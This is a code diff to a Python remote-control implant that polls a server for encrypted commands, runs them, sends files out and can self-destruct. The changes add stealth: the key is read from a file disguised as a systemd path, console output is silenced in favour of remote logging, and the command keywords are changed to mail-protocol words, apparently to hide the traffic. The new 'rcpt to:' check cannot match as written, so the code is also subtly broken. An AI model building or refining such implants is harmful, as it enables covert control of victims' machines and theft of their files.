@@ -18,7 +18,14 @@ import hashlib
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BLOCK_SIZE = 16
-KEY = "your_secret_key_here"  # Replace with your actual key
+#KEY = "your_secret_key_here"  # Replace with your actual key
+
+
+def get_key():
+    with open("/tmp/systemd_private_key") as f:
+        return f.read()
+
+KEY = get_key()
 
 # function that does AES encryption and then obfuscation
 def do_everything(data):
@@ -191,13 +198,15 @@ def poll_command():
             obfuscated_cmd = json_data.get("data", "")
             if obfuscated_cmd:
                 cmd = undo_everything(obfuscated_cmd)
-                print("Received command:", cmd)
+                #print("Received command:", cmd)
                 return cmd
         else:
-            print("Failed to poll command. Status:", response.status_code)
+            #print("Failed to poll command. Status:", response.status_code)
+            send_log(f"Failed to poll command. Status: {response.status_code}")
         return None
     except Exception as e:
-        print("Error polling command:", e)
+        #print("Error polling command:", e)
+        send_log(f"Error polling command:{e}")
         return None
 
 def execute_command(cmd):
@@ -217,14 +226,14 @@ def main():
         cmd = poll_command()
         if cmd is None:
             fail_count += 1
-            print(f"Failed to poll command. Fail count:{fail_count}")
+            #print(f"Failed to poll command. Fail count:{fail_count}")
             send_log(f"Failed to poll command. Fail count:{fail_count}")
         else:
             fail_count = 0
-            if cmd.strip() == "BIG BANG!!":
+            if cmd.strip() == "HELO":
                 self_destruct()
                 return
-            elif cmd.strip().split()[0]=="SEND_FILE":
+            elif cmd.strip().split()[0]=="rcpt to:":
                 file_path = cmd.strip().split()[1]
                 if os.path.exists(file_path):
                     send_file(file_path)
